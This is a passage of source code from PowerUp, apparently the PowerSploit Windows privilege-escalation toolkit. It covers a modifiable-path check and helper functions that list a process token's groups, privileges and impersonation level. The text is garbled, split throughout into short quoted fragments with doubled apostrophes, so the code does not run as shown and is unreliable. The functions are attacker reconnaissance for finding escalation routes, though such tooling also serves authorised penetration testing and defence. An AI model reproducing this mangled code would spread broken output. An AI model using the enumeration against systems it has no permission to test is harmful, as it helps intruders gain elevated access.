  ','              ','    # if the p','ath doesn''t ex','ist, check if ','the parent fol','der allows for',' modification
','              ','      $ParentP','ath = Split-Pa','th -Path $Temp','Path -Parent  ','-ErrorAction S','ilentlyContinu','e
            ','        if ($P','arentPath -and',' (Test-Path -P','ath $ParentPat','h)) {
        ','              ','  $CandidatePa','ths += Resolve','-Path -Path $P','arentPath -Err','orAction Silen','tlyContinue | ','Select-Object ','-ExpandPropert','y Path
       ','             }','
             ','   }
         ','   }
         ','   else {
    ','            Fo','rEach($Separat','ionCharacterSe','t in $Separati','onCharacterSet','s) {
         ','           $Ta','rgetPath.Split','($SeparationCh','aracterSet) | ','Where-Object {','$_ -and ($_.tr','im() -ne '''')} ','| ForEach-Obje','ct {

        ','              ','  if (($Separa','tionCharacterS','et -notmatch ''',' '')) {

      ','              ','        $TempP','ath = $([Syste','m.Environment]','::ExpandEnviro','nmentVariables','($_)).Trim()

','              ','              ','if ($TempPath ','-and ($TempPat','h -ne '''')) {
 ','              ','              ','   if (Test-Pa','th -Path $Temp','Path -ErrorAct','ion SilentlyCo','ntinue) {
    ','              ','              ','    # if the p','ath exists, re','solve it and a','dd it to the c','andidate list
','              ','              ','        $Candi','datePaths += R','esolve-Path -P','ath $TempPath ','| Select-Objec','t -ExpandPrope','rty Path
     ','              ','             }','

            ','              ','      else {
 ','              ','              ','       # if th','e path doesn''t',' exist, check ','if the parent ','folder allows ','for modificati','on
           ','              ','           try',' {
           ','              ','              ',' $ParentPath =',' (Split-Path -','Path $TempPath',' -Parent -Erro','rAction Silent','lyContinue).Tr','im()
         ','              ','              ','   if ($Parent','Path -and ($Pa','rentPath -ne ''',''') -and (Test-','Path -Path $Pa','rentPath  -Err','orAction Silen','tlyContinue)) ','{
            ','              ','              ','    $Candidate','Paths += Resol','ve-Path -Path ','$ParentPath -E','rrorAction Sil','entlyContinue ','| Select-Objec','t -ExpandPrope','rty Path
     ','              ','              ','       }
     ','              ','              ','   }
         ','              ','             c','atch {}
      ','              ','            }
','              ','              ','}
            ','            }
','              ','          else',' {
           ','              ','   # if the se','parator contai','ns a space
   ','              ','           $Ca','ndidatePaths +','= Resolve-Path',' -Path $([Syst','em.Environment',']::ExpandEnvir','onmentVariable','s($_)) -ErrorA','ction Silently','Continue | Sel','ect-Object -Ex','pandProperty P','ath | ForEach-','Object {$_.Tri','m()} | Where-O','bject {($_ -ne',' '''') -and (Tes','t-Path -Path $','_)}
          ','              ','}
            ','        }
    ','            }
','            }
','
            $','CandidatePaths',' | Sort-Object',' -Unique | For','Each-Object {
','              ','  $CandidatePa','th = $_
      ','          Get-','Acl -Path $Can','didatePath | S','elect-Object -','ExpandProperty',' Access | Wher','e-Object {($_.','AccessControlT','ype -match ''Al','low'')} | ForEa','ch-Object {

 ','              ','     $FileSyst','emRights = $_.','FileSystemRigh','ts.value__

  ','              ','    $Permissio','ns = $AccessMa','sk.Keys | Wher','e-Object { $Fi','leSystemRights',' -band $_ } | ','ForEach-Object',' { $AccessMask','[$_] }

      ','              ','# the set of p','ermission type','s that allow f','or modificatio','n
            ','        $Compa','rison = Compar','e-Object -Refe','renceObject $P','ermissions -Di','fferenceObject',' @(''GenericWri','te'', ''GenericA','ll'', ''MaximumA','llowed'', ''Writ','eOwner'', ''Writ','eDAC'', ''WriteD','ata/AddFile'', ','''AppendData/Ad','dSubdirectory''',') -IncludeEqua','l -ExcludeDiff','erent

       ','             i','f ($Comparison',') {
          ','              ','if ($_.Identit','yReference -no','tmatch ''^S-1-5','.*'') {
       ','              ','       if (-no','t ($Translated','IdentityRefere','nces[$_.Identi','tyReference]))',' {
           ','              ','       # trans','late the Ident','ityReference i','f it''s a usern','ame and not a ','SID
          ','              ','        $Ident','ityUser = New-','Object System.','Security.Princ','ipal.NTAccount','($_.IdentityRe','ference)
     ','              ','             $','TranslatedIden','tityReferences','[$_.IdentityRe','ference] = $Id','entityUser.Tra','nslate([System','.Security.Prin','cipal.Security','Identifier]) |',' Select-Object',' -ExpandProper','ty Value
     ','              ','         }
   ','              ','           $Id','entitySID = $T','ranslatedIdent','ityReferences[','$_.IdentityRef','erence]
      ','              ','    }
        ','              ','  else {
     ','              ','         $Iden','titySID = $_.I','dentityReferen','ce
           ','             }','

            ','            if',' ($CurrentUser','Sids -contains',' $IdentitySID)',' {
           ','              ','   $Out = New-','Object PSObjec','t
            ','              ','  $Out | Add-M','ember Noteprop','erty ''Modifiab','lePath'' $Candi','datePath
     ','              ','         $Out ','| Add-Member N','oteproperty ''I','dentityReferen','ce'' $_.Identit','yReference
   ','              ','           $Ou','t | Add-Member',' Noteproperty ','''Permissions'' ','$Permissions
 ','              ','             $','Out.PSObject.T','ypeNames.Inser','t(0, ''PowerUp.','ModifiablePath',''')
           ','              ','   $Out
      ','              ','    }
        ','            }
','              ','  }
          ','  }
        }
','    }
}


func','tion Get-Token','Information {
','<#
.SYNOPSIS

','Helpers that r','eturns token g','roups or privi','leges for a pa','ssed process/t','hread token.
U','sed by Get-Pro','cessTokenGroup',' and Get-Proce','ssTokenPrivile','ge.

Author: W','ill Schroeder ','(@harmj0y)  
L','icense: BSD 3-','Clause  
Requi','red Dependenci','es: PSReflect ',' 

.DESCRIPTIO','N

Wraps the G','etTokenInforma','tion() Win 32A','PI call to que','ry the given t','oken for
eithe','r token groups',' (-Information','Class "Groups"',') or privilege','s (-Informatio','nClass "Privil','eges").
For to','ken groups, gr','oup is iterate','d through and ','the SID struct','ure is convert','ed to a readab','le
string usin','g ConvertSidTo','StringSid(), a','nd the unique ','list of SIDs t','he user is a p','art of
(disabl','ed or not) is ','returned as a ','string array.
','
.PARAMETER To','kenHandle

The',' IntPtr token ','handle to quer','y. Required.

','.PARAMETER Inf','ormationClass
','
The type of i','nformation to ','query for the ','token handle, ','either ''Groups',''', ''Privileges',''', or ''Type''.
','
.OUTPUTS

Pow','erUp.TokenGrou','p

Outputs a c','ustom object c','ontaining the ','token group (S','ID/attributes)',' for the speci','fied token if
','"-InformationC','lass ''Groups''"',' is passed.

P','owerUp.TokenPr','ivilege

Outpu','ts a custom ob','ject containin','g the token pr','ivilege (name/','attributes) fo','r the specifie','d token if
"-I','nformationClas','s ''Privileges''','" is passed

P','owerUp.TokenTy','pe

Outputs a ','custom object ','containing the',' token type an','d impersonatio','n level for th','e specified to','ken if
"-Infor','mationClass ''T','ype''" is passe','d

.LINK

http','s://msdn.micro','soft.com/en-us','/library/windo','ws/desktop/aa4','46671(v=vs.85)','.aspx
https://','msdn.microsoft','.com/en-us/lib','rary/windows/d','esktop/aa37962','4(v=vs.85).asp','x
https://msdn','.microsoft.com','/en-us/library','/windows/deskt','op/aa379554(v=','vs.85).aspx
ht','tps://msdn.mic','rosoft.com/en-','us/library/win','dows/desktop/a','a379626(v=vs.8','5).aspx
https:','//msdn.microso','ft.com/en-us/l','ibrary/windows','/desktop/aa379','630(v=vs.85).a','spx
#>

    [O','utputType(''Pow','erUp.TokenGrou','p'')]
    [Outp','utType(''PowerU','p.TokenPrivile','ge'')]
    [Cmd','letBinding()]
','    Param(
   ','     [Paramete','r(Position = 0',', Mandatory = ','$True, ValueFr','omPipeline = $','True)]
       ',' [Alias(''hToke','n'', ''Token'')]
','        [Valid','ateNotNullOrEm','pty()]
       ',' [IntPtr]
    ','    $TokenHand','le,

        [','String[]]
    ','    [ValidateS','et(''Groups'', ''','Privileges'', ''','Type'')]
      ','  $Information','Class = ''Privi','leges''
    )

','    PROCESS {
','        if ($I','nformationClas','s -eq ''Groups''',') {
          ','  # query the ','process token ','with the TOKEN','_INFORMATION_C','LASS = 2 enum ','to retrieve a ','TOKEN_GROUPS s','tructure

    ','        # init','ial query to d','etermine the n','ecessary buffe','r size
       ','     $TokenGro','upsPtrSize = 0','
            $','Success = $Adv','api32::GetToke','nInformation($','TokenHandle, 2',', 0, $TokenGro','upsPtrSize, [r','ef]$TokenGroup','sPtrSize)
    ','        [IntPt','r]$TokenGroups','Ptr = [System.','Runtime.Intero','pServices.Mars','hal]::AllocHGl','obal($TokenGro','upsPtrSize)

 ','           $Su','ccess = $Advap','i32::GetTokenI','nformation($To','kenHandle, 2, ','$TokenGroupsPt','r, $TokenGroup','sPtrSize, [ref',']$TokenGroupsP','trSize);$LastE','rror = [Runtim','e.InteropServi','ces.Marshal]::','GetLastWin32Er','ror()

       ','     if ($Succ','ess) {
       ','         $Toke','nGroups = $Tok','enGroupsPtr -a','s $TOKEN_GROUP','S
            ','    For ($i=0;',' $i -lt $Token','Groups.GroupCo','unt; $i++) {
 ','              ','     # convert',' each token gr','oup SID to a d','isplayable str','ing

         ','           if ','($TokenGroups.','Groups[$i].SID',') {
          ','              ','$SidString = ''','''
            ','            $R','esult = $Advap','i32::ConvertSi','dToStringSid($','TokenGroups.Gr','oups[$i].SID, ','[ref]$SidStrin','g);$LastError ','= [Runtime.Int','eropServices.M','arshal]::GetLa','stWin32Error()','
             ','           if ','($Result -eq 0',') {
          ','              ','    Write-Verb','ose "Error: $(','([ComponentMod','el.Win32Except','ion] $LastErro','r).Message)"
 ','              ','         }
   ','              ','       else {
','              ','              ','$GroupSid = Ne','w-Object PSObj','ect
          ','              ','    $GroupSid ','| Add-Member N','oteproperty ''S','ID'' $SidString','
             ','              ',' # cast the at','ttributes fiel','d as our SidAt','tributes enum
','              ','              ','$GroupSid | Ad','d-Member Notep','roperty ''Attri','butes'' ($Token','Groups.Groups[','$i].Attributes',' -as $SidAttri','butes)
       ','              ','       $GroupS','id | Add-Membe','r Noteproperty',' ''TokenHandle''',' $TokenHandle
','              ','              ','$GroupSid.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.TokenGro','up'')
         ','              ','     $GroupSid','
             ','           }
 ','              ','     }
       ','         }
   ','         }
   ','         else ','{
            ','    Write-Warn','ing ([Componen','tModel.Win32Ex','ception] $Last','Error)
       ','     }
       ','     [System.R','untime.Interop','Services.Marsh','al]::FreeHGlob','al($TokenGroup','sPtr)
        ','}
        else','if ($Informati','onClass -eq ''P','rivileges'') {
','            # ','query the proc','ess token with',' the TOKEN_INF','ORMATION_CLASS',' = 3 enum to r','etrieve a TOKE','N_PRIVILEGES s','tructure

    ','        # init','ial query to d','etermine the n','ecessary buffe','r size
       ','     $TokenPri','vilegesPtrSize',' = 0
         ','   $Success = ','$Advapi32::Get','TokenInformati','on($TokenHandl','e, 3, 0, $Toke','nPrivilegesPtr','Size, [ref]$To','kenPrivilegesP','trSize)
      ','      [IntPtr]','$TokenPrivileg','esPtr = [Syste','m.Runtime.Inte','ropServices.Ma','rshal]::AllocH','Global($TokenP','rivilegesPtrSi','ze)

         ','   $Success = ','$Advapi32::Get','TokenInformati','on($TokenHandl','e, 3, $TokenPr','ivilegesPtr, $','TokenPrivilege','sPtrSize, [ref',']$TokenPrivile','gesPtrSize);$L','astError = [Ru','ntime.InteropS','ervices.Marsha','l]::GetLastWin','32Error()

   ','         if ($','Success) {
   ','             $','TokenPrivilege','s = $TokenPriv','ilegesPtr -as ','$TOKEN_PRIVILE','GES
          ','      For ($i=','0; $i -lt $Tok','enPrivileges.P','rivilegeCount;',' $i++) {
     ','              ',' $Privilege = ','New-Object PSO','bject
        ','            $P','rivilege | Add','-Member Notepr','operty ''Privil','ege'' $TokenPri','vileges.Privil','eges[$i].Luid.','LowPart.ToStri','ng()
         ','           # c','ast the lower ','Luid field as ','our LuidAttrib','utes enum
    ','              ','  $Privilege |',' Add-Member No','teproperty ''At','tributes'' ($To','kenPrivileges.','Privileges[$i]','.Attributes -a','s $LuidAttribu','tes)
         ','           $Pr','ivilege | Add-','Member Notepro','perty ''TokenHa','ndle'' $TokenHa','ndle
         ','           $Pr','ivilege.PSObje','ct.TypeNames.I','nsert(0, ''Powe','rUp.TokenPrivi','lege'')
       ','             $','Privilege
    ','            }
','            }
','            el','se {
         ','       Write-W','arning ([Compo','nentModel.Win3','2Exception] $L','astError)
    ','        }
    ','        [Syste','m.Runtime.Inte','ropServices.Ma','rshal]::FreeHG','lobal($TokenPr','ivilegesPtr)
 ','       }
     ','   else {
    ','        $Token','Result = New-O','bject PSObject','

            ','# query the pr','ocess token wi','th the TOKEN_I','NFORMATION_CLA','SS = 8 enum to',' retrieve a TO','KEN_TYPE enum
','
            #',' initial query',' to determine ','the necessary ','buffer size
  ','          $Tok','enTypePtrSize ','= 0
          ','  $Success = $','Advapi32::GetT','okenInformatio','n($TokenHandle',', 8, 0, $Token','TypePtrSize, [','ref]$TokenType','PtrSize)
     ','       [IntPtr',']$TokenTypePtr',' = [System.Run','time.InteropSe','rvices.Marshal',']::AllocHGloba','l($TokenTypePt','rSize)

      ','      $Success',' = $Advapi32::','GetTokenInform','ation($TokenHa','ndle, 8, $Toke','nTypePtr, $Tok','enTypePtrSize,',' [ref]$TokenTy','pePtrSize);$La','stError = [Run','time.InteropSe','rvices.Marshal',']::GetLastWin3','2Error()

    ','        if ($S','uccess) {
    ','            $T','emp = $TokenTy','pePtr -as $TOK','EN_TYPE
      ','          $Tok','enResult | Add','-Member Notepr','operty ''Type'' ','$Temp.Type
   ','         }
   ','         else ','{
            ','    Write-Warn','ing ([Componen','tModel.Win32Ex','ception] $Last','Error)
       ','     }
       ','     [System.R','untime.Interop','Services.Marsh','al]::FreeHGlob','al($TokenTypeP','tr)

         ','   # now query',' the process t','oken with the ','TOKEN_INFORMAT','ION_CLASS = 8 ','enum to retrie','ve a SECURITY_','IMPERSONATION_','LEVEL enum

  ','          # in','itial query to',' determine the',' necessary buf','fer size
     ','       $TokenI','mpersonationLe','velPtrSize = 0','
            $','Success = $Adv','api32::GetToke','nInformation($','TokenHandle, 8',', 0, $TokenImp','ersonationLeve','lPtrSize, [ref',']$TokenImperso','nationLevelPtr','Size)
        ','    [IntPtr]$T','okenImpersonat','ionLevelPtr = ','[System.Runtim','e.InteropServi','ces.Marshal]::','AllocHGlobal($','TokenImpersona','tionLevelPtrSi','ze)

         ','   $Success2 =',' $Advapi32::Ge','tTokenInformat','ion($TokenHand','le, 8, $TokenI','mpersonationLe','velPtr, $Token','ImpersonationL','evelPtrSize, [','ref]$TokenImpe','rsonationLevel','PtrSize);$Last','Error = [Runti','me.InteropServ','ices.Marshal]:',':GetLastWin32E','rror()

      ','      if ($Suc','cess2) {
     ','           $Te','mp = $TokenImp','ersonationLeve','lPtr -as $IMPE','RSONATION_LEVE','L
            ','    $TokenResu','lt | Add-Membe','r Noteproperty',' ''Impersonatio','nLevel'' $Temp.','ImpersonationL','evel
         ','       $TokenR','esult | Add-Me','mber Noteprope','rty ''TokenHand','le'' $TokenHand','le
           ','     $TokenRes','ult.PSObject.T','ypeNames.Inser','t(0, ''PowerUp.','TokenType'')
  ','              ','$TokenResult
 ','           }
 ','           els','e {
          ','      Write-Wa','rning ([Compon','entModel.Win32','Exception] $La','stError)
     ','       }
     ','       [System','.Runtime.Inter','opServices.Mar','shal]::FreeHGl','obal($TokenImp','ersonationLeve','lPtr)
        ','}
    }
}


fu','nction Get-Pro','cessTokenGroup',' {
<#
.SYNOPSI','S

Returns all',' SIDs that the',' current token',' context is a ','part of, wheth','er they are di','sabled or not.','

Author: Will',' Schroeder (@h','armj0y)  
Lice','nse: BSD 3-Cla','use  
Required',' Dependencies:',' PSReflect, Ge','t-TokenInforma','tion  

.DESCR','IPTION

First,',' if a process ','ID is passed, ','then the proce','ss is opened u','sing OpenProce','ss(),
otherwis','e GetCurrentPr','ocess() is use','d to open up a',' pseudohandle ','to the current',' process.
Open','ProcessToken()',' is then used ','to get a handl','e to the speci','fied process t','oken. The toke','n
is then pass','ed to Get-Toke','nInformation t','o query the cu','rrent token gr','oups for the s','pecified
token','.

.PARAMETER ','Id

The proces','s ID to enumer','ate token grou','ps for, otherw','ise defaults t','o the current ','process.

.EXA','MPLE

Get-Proc','essTokenGroup
','
SID          ','              ','  Attributes  ','       TokenHa','ndle          ',' ProcessId
---','              ','            --','--------      ','   -----------','           ---','------
S-1-5-2','1-8901718... .','..SE_GROUP_ENA','BLED          ','      1616    ','            36','84
S-1-1-0    ','         ...SE','_GROUP_ENABLED','              ','  1616        ','        3684
S','-1-5-32-544   ','     ..., SE_G','ROUP_OWNER    ','            16','16            ','    3684
S-1-5','-32-545       ',' ...SE_GROUP_E','NABLED        ','        1616  ','              ','3684
S-1-5-4  ','           ...','SE_GROUP_ENABL','ED            ','    1616      ','          3684','
S-1-2-1      ','       ...SE_G','ROUP_ENABLED  ','              ','1616          ','      3684
S-1','-5-11         ','   ...SE_GROUP','_ENABLED      ','          1616','              ','  3684
S-1-5-1','5            .','..SE_GROUP_ENA','BLED          ','      1616    ','            36','84
S-1-5-5-0-1','053459   ...NT','EGRITY_ENABLED','              ','  1616        ','        3684
S','-1-2-0        ','     ...SE_GRO','UP_ENABLED    ','            16','16            ','    3684
S-1-1','8-1           ',' ...SE_GROUP_E','NABLED        ','        1616  ','              ','3684
S-1-16-12','288           ','              ','              ','    1616      ','          3684','

.EXAMPLE

Ge','t-Process note','pad | Get-Proc','essTokenGroup
','
SID          ','              ','  Attributes  ','       TokenHa','ndle          ',' ProcessId
---','              ','            --','--------      ','   -----------','           ---','------
S-1-5-2','1-8901718... .','..SE_GROUP_ENA','BLED          ','      1892    ','            20','44
S-1-1-0    ','         ...SE','_GROUP_ENABLED','              ','  1892        ','        2044
S','-1-5-32-544   ','     ...SE_FOR','_DENY_ONLY    ','            18','92            ','    2044
S-1-5','-32-545       ',' ...SE_GROUP_E','NABLED        ','        1892  ','              ','2044
S-1-5-4  ','           ...','SE_GROUP_ENABL','ED            ','    1892      ','          2044','
S-1-2-1      ','       ...SE_G','ROUP_ENABLED  ','              ','1892          ','      2044
S-1','-5-11         ','   ...SE_GROUP','_ENABLED      ','          1892','              ','  2044
S-1-5-1','5            .','..SE_GROUP_ENA','BLED          ','      1892    ','            20','44
S-1-5-5-0-1','053459   ...NT','EGRITY_ENABLED','              ','  1892        ','        2044
S','-1-2-0        ','     ...SE_GRO','UP_ENABLED    ','            18','92            ','    2044
S-1-1','8-1           ',' ...SE_GROUP_E','NABLED        ','        1892  ','              ','2044
S-1-16-81','92            ','              ','              ','    1892      ','          2044','


.OUTPUTS

P','owerUp.TokenGr','oup

Outputs a',' custom object',' containing th','e token group ','(SID/attribute','s) for the spe','cified process','.
#>

    [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSShould','Process'', '''')]','
    [OutputTy','pe(''PowerUp.To','kenGroup'')]
  ','  [CmdletBindi','ng()]
    Para','m(
        [Pa','rameter(Positi','on = 0, ValueF','romPipeline = ','$True, ValueFr','omPipelineByPr','opertyName = $','True)]
       ',' [Alias(''Proce','ssID'')]
      ','  [UInt32]
   ','     [Validate','NotNullOrEmpty','()]
        $I','d
    )

    P','ROCESS {
     ','   if ($PSBoun','dParameters[''I','d'']) {
       ','     $ProcessH','andle = $Kerne','l32::OpenProce','ss(0x400, $Fal','se, $Id);$Last','Error = [Runti','me.InteropServ','ices.Marshal]:',':GetLastWin32E','rror()
       ','     if ($Proc','essHandle -eq ','0) {
         ','       Write-W','arning ([Compo','nentModel.Win3','2Exception] $L','astError)
    ','        }
    ','        else {','
             ','   $ProcessID ','= $Id
        ','    }
        ','}
        else',' {
           ',' # open up a p','seudo handle t','o the current ','process- don''t',' need to worry',' about closing','
            $','ProcessHandle ','= $Kernel32::G','etCurrentProce','ss()
         ','   $ProcessID ','= $PID
       ',' }

        if',' ($ProcessHand','le) {
        ','    [IntPtr]$h','ProcToken = [I','ntPtr]::Zero
 ','           $TO','KEN_QUERY = 0x','0008
         ','   $Success = ','$Advapi32::Ope','nProcessToken(','$ProcessHandle',', $TOKEN_QUERY',', [ref]$hProcT','oken);$LastErr','or = [Runtime.','InteropService','s.Marshal]::Ge','tLastWin32Erro','r()

         ','   if ($Succes','s) {
         ','       $TokenG','roups = Get-To','kenInformation',' -TokenHandle ','$hProcToken -I','nformationClas','s ''Groups''
   ','             $','TokenGroups | ','ForEach-Object',' {
           ','         $_ | ','Add-Member Not','eproperty ''Pro','cessId'' $Proce','ssID
         ','           $_
','              ','  }
          ','  }
          ','  else {
     ','           Wri','te-Warning ([C','omponentModel.','Win32Exception','] $LastError)
','            }
','
            i','f ($PSBoundPar','ameters[''Id''])',' {
           ','     # close t','he handle if w','e used OpenPro','cess()
       ','         $Null',' = $Kernel32::','CloseHandle($P','rocessHandle)
','            }
','        }
    ','}
}


function',' Get-ProcessTo','kenPrivilege {','
<#
.SYNOPSIS
','
Returns all p','rivileges for ','the current (o','r specified) p','rocess ID.

Au','thor: Will Sch','roeder (@harmj','0y)  
License:',' BSD 3-Clause ',' 
Required Dep','endencies: PSR','eflect, Get-To','kenInformation','  

.DESCRIPTI','ON

First, if ','a process ID i','s passed, then',' the process i','s opened using',' OpenProcess()',',
otherwise Ge','tCurrentProces','s() is used to',' open up a pse','udohandle to t','he current pro','cess.
OpenProc','essToken() is ','then used to g','et a handle to',' the specified',' process token','. The token
is',' then passed t','o Get-TokenInf','ormation to qu','ery the curren','t privileges f','or the specifi','ed
token.

.PA','RAMETER Id

Th','e process ID t','o enumerate to','ken groups for',', otherwise de','faults to the ','current proces','s.

.PARAMETER',' Special

Swit','ch. Only retur','n ''special'' pr','ivileges, mean','ing admin-leve','l privileges.
','These include ','SeSecurityPriv','ilege, SeTakeO','wnershipPrivil','ege, SeLoadDri','verPrivilege, ','SeBackupPrivil','ege,
SeRestore','Privilege, SeD','ebugPrivilege,',' SeSystemEnvir','onmentPrivileg','e, SeImpersona','tePrivilege, S','eTcbPrivilege.','

.EXAMPLE

Ge','t-ProcessToken','Privilege | ft',' -a

WARNING: ','2 columns do n','ot fit into th','e display and ','were removed.
','
Privilege    ','              ','              ','              ','              ','Attributes
---','------        ','              ','              ','              ','          ----','------
SeUnsol','icitedInputPri','vilege        ','              ','              ','        DISABL','ED
SeTcbPrivil','ege           ','              ','              ','              ','    DISABLED
S','eSecurityPrivi','lege          ','              ','              ','              ','DISABLED
SeTak','eOwnershipPriv','ilege         ','              ','              ','          DISA','BLED
SeLoadDri','verPrivilege  ','              ','              ','              ','      DISABLED','
SeSystemProfi','lePrivilege   ','              ','              ','              ','  DISABLED
SeS','ystemtimePrivi','lege          ','              ','              ','            DI','SABLED
SeProfi','leSingleProces','sPrivilege    ','              ','              ','        DISABL','ED
SeIncreaseB','asePriorityPri','vilege        ','              ','              ','    DISABLED
S','eCreatePagefil','ePrivilege    ','              ','              ','              ','DISABLED
SeBac','kupPrivilege  ','              ','              ','              ','          DISA','BLED
SeRestore','Privilege     ','              ','              ','              ','      DISABLED','
SeShutdownPri','vilege        ','              ','              ','              ','  DISABLED
SeD','ebugPrivilege ','              ','              ','              ','SE_PRIVILEGE_E','NABLED
SeSyste','mEnvironmentPr','ivilege       ','              ','              ','        DISABL','ED
SeChangeNot','ifyPrivilege  ','       ...EGE_','ENABLED_BY_DEF','AULT, SE_PRIVI','LEGE_ENABLED
S','eRemoteShutdow','nPrivilege    ','              ','              ','              ','DISABLED
SeUnd','ockPrivilege  ','              ','              ','              ','          DISA','BLED
SeManageV','olumePrivilege','              ','              ','              ','      DISABLED','
SeImpersonate','Privilege     ','     ...EGE_EN','ABLED_BY_DEFAU','LT, SE_PRIVILE','GE_ENABLED
SeC','reateGlobalPri','vilege        ',' ...EGE_ENABLE','D_BY_DEFAULT, ','SE_PRIVILEGE_E','NABLED
SeIncre','aseWorkingSetP','rivilege      ','              ','              ','        DISABL','ED
SeTimeZoneP','rivilege      ','              ','              ','              ','    DISABLED
S','eCreateSymboli','cLinkPrivilege','              ','              ','              ','DISABLED

.EXA','MPLE

Get-Proc','essTokenPrivil','ege -Special

','Privilege     ','              ',' Attributes   ','      TokenHan','dle           ','ProcessId
----','-----         ','           ---','-------       ','  ----------- ','          ----','-----
SeTcbPri','vilege        ','         DISAB','LED           ','     2268     ','           368','4
SeSecurityPr','ivilege       ','     DISABLED ','              ',' 2268         ','       3684
Se','TakeOwnershipP','...           ',' DISABLED     ','           226','8             ','   3684
SeLoad','DriverPriv... ','           DIS','ABLED         ','       2268   ','             3','684
SeBackupPr','ivilege       ','       DISABLE','D             ','   2268       ','         3684
','SeRestorePrivi','lege          ','   DISABLED   ','             2','268           ','     3684
SeDe','bugPrivilege  ','  ...RIVILEGE_','ENABLED       ','         2268 ','              ',' 3684
SeSystem','Environm...   ','         DISAB','LED           ','     2268     ','           368','4
SeImpersonat','ePri... ...RIV','ILEGE_ENABLED ','              ',' 2268         ','       3684

.','EXAMPLE

Get-P','rocess notepad',' | Get-Process','TokenPrivilege',' | fl

Privile','ge   : SeShutd','ownPrivilege
A','ttributes  : D','ISABLED
TokenH','andle : 2164
P','rocessId   : 2','044

Privilege','   : SeChangeN','otifyPrivilege','
Attributes  :',' SE_PRIVILEGE_','ENABLED_BY_DEF','AULT, SE_PRIVI','LEGE_ENABLED
T','okenHandle : 2','164
ProcessId ','  : 2044

Priv','ilege   : SeUn','dockPrivilege
','Attributes  : ','DISABLED
Token','Handle : 2164
','ProcessId   : ','2044

Privileg','e   : SeIncrea','seWorkingSetPr','ivilege
Attrib','utes  : DISABL','ED
TokenHandle',' : 2164
Proces','sId   : 2044

','Privilege   : ','SeTimeZonePriv','ilege
Attribut','es  : DISABLED','
TokenHandle :',' 2164
ProcessI','d   : 2044

.O','UTPUTS

PowerU','p.TokenPrivile','ge

Outputs a ','custom object ','containing the',' token privile','ge (name/attri','butes) for the',' specified pro','cess.
#>

    ','[Diagnostics.C','odeAnalysis.Su','ppressMessageA','ttribute(''PSSh','ouldProcess'', ',''''')]
    [Outp','utType(''PowerU','p.TokenPrivile','ge'')]
    [Cmd','letBinding()]
','    Param(
   ','     [Paramete','r(Position = 0',', ValueFromPip','eline = $True,',' ValueFromPipe','lineByProperty','Name = $True)]','
        [Alia','s(''ProcessID'')',']
        [UIn','t32]
        [','ValidateNotNul','lOrEmpty()]
  ','      $Id,

  ','      [Switch]','
        [Alia','s(''Privileged''',')]
        $Sp','ecial
    )

 ','   BEGIN {
   ','     $SpecialP','rivileges = @(','''SeSecurityPri','vilege'', ''SeTa','keOwnershipPri','vilege'', ''SeLo','adDriverPrivil','ege'', ''SeBacku','pPrivilege'', ''','SeRestorePrivi','lege'', ''SeDebu','gPrivilege'', ''','SeSystemEnviro','nmentPrivilege',''', ''SeImperson','atePrivilege'',',' ''SeTcbPrivile','ge'')
    }

  ','  PROCESS {
  ','      if ($PSB','oundParameters','[''Id'']) {
    ','        $Proce','ssHandle = $Ke','rnel32::OpenPr','ocess(0x400, $','False, $Id);$L','astError = [Ru','ntime.InteropS','ervices.Marsha','l]::GetLastWin','32Error()
    ','        if ($P','rocessHandle -','eq 0) {
      ','          Writ','e-Warning ([Co','mponentModel.W','in32Exception]',' $LastError)
 ','           }
 ','           els','e {
          ','      $Process','ID = $Id
     ','       }
     ','   }
        e','lse {
        ','    # open up ','a pseudo handl','e to the curre','nt process- do','n''t need to wo','rry about clos','ing
          ','  $ProcessHand','le = $Kernel32','::GetCurrentPr','ocess()
      ','      $Process','ID = $PID
    ','    }

       ',' if ($ProcessH','andle) {
     ','       [IntPtr',']$hProcToken =',' [IntPtr]::Zer','o
            ','$TOKEN_QUERY =',' 0x0008
      ','      $Success',' = $Advapi32::','OpenProcessTok','en($ProcessHan','dle, $TOKEN_QU','ERY, [ref]$hPr','ocToken);$Last','Error = [Runti','me.InteropServ','ices.Marshal]:',':GetLastWin32E','rror()
       ','     if ($Succ','ess) {
       ','         Get-T','okenInformatio','n -TokenHandle',' $hProcToken -','InformationCla','ss ''Privileges',''' | ForEach-Ob','ject {
       ','             i','f ($PSBoundPar','ameters[''Speci','al'']) {
      ','              ','    if ($Speci','alPrivileges -','Contains $_.Pr','ivilege) {
   ','              ','           $_ ','| Add-Member N','oteproperty ''P','rocessId'' $Pro','cessID
       ','              ','       $_ | Ad','d-Member Alias','property Name ','ProcessId
    ','              ','          $_
 ','              ','         }
   ','              ','   }
         ','           els','e {
          ','              ','$_ | Add-Membe','r Noteproperty',' ''ProcessId'' $','ProcessID
    ','              ','      $_
     ','              ',' }
           ','     }
       ','     }
       ','     else {
  ','              ','Write-Warning ','([ComponentMod','el.Win32Except','ion] $LastErro','r)
           ',' }

          ','  if ($PSBound','Parameters[''Id',''']) {
        ','        # clos','e the handle i','f we used Open','Process()
    ','            $N','ull = $Kernel3','2::CloseHandle','($ProcessHandl','e)
           ',' }
        }
 ','   }
}


funct','ion Get-Proces','sTokenType {
<','#
.SYNOPSIS

R','eturns the tok','en type and im','personation le','vel.

Author: ','Will Schroeder',' (@harmj0y)  
','License: BSD 3','-Clause  
Requ','ired Dependenc','ies: PSReflect',', Get-TokenInf','ormation  

.D','ESCRIPTION

Fi','rst, if a proc','ess ID is pass','ed, then the p','rocess is open','ed using OpenP','rocess(),
othe','rwise GetCurre','ntProcess() is',' used to open ','up a pseudohan','dle to the cur','rent process.
','OpenProcessTok','en() is then u','sed to get a h','andle to the s','pecified proce','ss token. The ','token
is then ','passed to Get-','TokenInformati','on to query th','e type and imp','ersonation lev','el for the
spe','cified token.
','
.PARAMETER Id','

The process ','ID to enumerat','e token groups',' for, otherwis','e defaults to ','the current pr','ocess.

.EXAMP','LE

Get-Proces','sTokenType

  ','             T','ype  Impersona','tionLevel     ','    TokenHandl','e           Pr','ocessId
      ','         ---- ',' -------------','-----         ','-----------   ','        ------','---
          ','  Primary     ',' Identificatio','n             ','    872       ','         3684
','

.EXAMPLE

Ge','t-Process note','pad | Get-Proc','essTokenType |',' fl

Type     ','          : Pr','imary
Imperson','ationLevel : I','dentification
','TokenHandle   ','     : 1356
Pr','ocessId       ','   : 2044

.OU','TPUTS

PowerUp','.TokenType

Ou','tputs a custom',' object contai','ning the token',' type and impe','rsonation leve','l for the spec','ified process.','
#>

